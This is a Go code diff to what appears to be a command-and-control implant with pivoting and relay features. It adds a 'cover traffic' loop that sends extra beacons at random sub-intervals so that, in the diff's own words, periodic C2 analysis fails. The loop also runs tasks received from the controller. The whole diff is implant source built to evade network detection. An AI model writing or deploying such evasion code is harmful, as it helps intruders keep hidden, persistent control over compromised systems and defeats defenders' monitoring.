@@ -141,6 +141,24 @@ func sleepUntilWorkHours() {
 // Pivot features (pipe_server, http_pivot) use it for N-hop relay via rawForwarder.
 var activeTransport transport
 
+// coverTrafficLoop fires extra beacons at random sub-intervals so inter-beacon
+// timing has a wide, irregular distribution — making periodic C2 analysis fail.
+func coverTrafficLoop(t transport, state *beaconState) {
+	for {
+		state.mu.Lock()
+		base := time.Duration(state.sleepSec) * time.Second
+		state.mu.Unlock()
+		// Random fraction of current interval: 10%–90%
+		frac := rand.Float64()*0.80 + 0.10
+		time.Sleep(time.Duration(float64(base) * frac))
+		if tasks, err := t.beacon(); err == nil {
+			for _, task := range tasks {
+				go dispatchTask(t, task)
+			}
+		}
+	}
+}
+
 func Run(t transport) {
 	activeTransport = t
 	sleepSec, jitterPct := parseSleepConfig()
@@ -167,6 +185,9 @@ outer:
 				AgentCertPEM = ""
 				AgentKeyPEM  = ""
 				CACertPEM    = ""
+			}
+			if CoverTraffic == "true" {
+				go coverTrafficLoop(t, state)
 			}
 			break
 		}
